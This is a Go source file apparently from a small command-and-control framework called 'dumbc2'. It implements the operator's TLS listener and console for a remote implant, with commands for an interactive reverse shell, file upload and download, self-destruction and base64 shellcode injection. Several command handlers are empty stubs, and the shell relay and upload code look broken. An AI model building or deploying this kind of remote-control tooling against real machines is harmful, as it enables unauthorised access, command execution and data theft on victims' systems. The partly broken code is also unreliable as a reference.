package useri

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/hashicorp/yamux"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

const (
	downloadCmd        = "DWLD"
	uploadCmd          = "UPLD"
	selfDestroyCmd     = "BOOM"
	getShellCmd        = "BASH"
	injectShellCodeCmd = "INJE"
)

func StartServer(userOP config.UserOperation) {
	// server mode
	fladdr := userOP.ListenAddr
	lbserver, err := transport.TLSServerBuilder(fladdr, true)
	if err != nil {
		panic(err)
	}
	for true {
		if lbserver != nil {
			log.Println("Listen to Port Successfully, Wait for connection...")
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
			handleClient(conn)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}

func printHelp() {
	fmt.Println(
		`
Usage: 
bash = Get Shell (Interactive)
upload <Source File Path> <Destination File Path> = Upload file
download <Source File Path> <Destination File Path> = Download file
boom = Self-Destroy
exit = Close Program
help = Show This Message
inject <BASE64-Encoded Code> = Execute Shell Code
`)
}

func handleClient(conn net.Conn) {
	// start as tls server, means it's a reverse shell
	printHelp()
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
	ymconf := yamux.Config{
		AcceptBacklog:          256,
		EnableKeepAlive:        true,
		KeepAliveInterval:      time.Second * 20,
		ConnectionWriteTimeout: time.Minute * 5,
		MaxStreamWindowSize:    256 * 1024,
		LogOutput:              os.Stderr,
	}
	ymserv, err := yamux.Server(conn, &ymconf)
	if err != nil {
		log.Fatalln(err)
	}
	cleanup := func() {
		_ = ymserv.Close()
		_ = conn.Close()
	}
	defer cleanup()
	for true {
		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		recvconn, err := ymserv.Accept()
		if err != nil {
			log.Println("Mux Error.")
			continue
		}
		switch useriptD[0] {
		case "upload":
			fd, err := os.Stat(useriptD[1])
			if err != nil {
				log.Println(err)
				continue
			}
		case "download":

		case "boom":

		case "bash":
			fmt.Println("** PLease Note This Shell doesn't Support TTY or Upgrade to TTY. **\n")

			// no need to check pingback
			copydata := func(r io.Reader, w io.Writer) {
				_, err := io.Copy(w, r)
				if err != nil {
					log.Println(err)
				}
			}
			go copydata(os.Stdout, conn) //todo:connection change to stream here
			scanner := bufio.NewScanner(os.Stdin)
			for scanner.Scan() {
				inputcmd := scanner.Bytes()
				_, err := conn.Write(inputcmd)
				if err != nil {
					log.Println(err)
					break
				}
				if bytes.Equal(inputcmd, []byte("exit\n")) || bytes.Equal(inputcmd, []byte("exit\r\n")) || bytes.Equal(inputcmd, []byte("exit")) {
					break
				}
			}
			_ = conn.Close()
		case "inject":

		case "exit":
			return
		case "help":
			fallthrough
		default:
			printHelp()
		}
	}
}
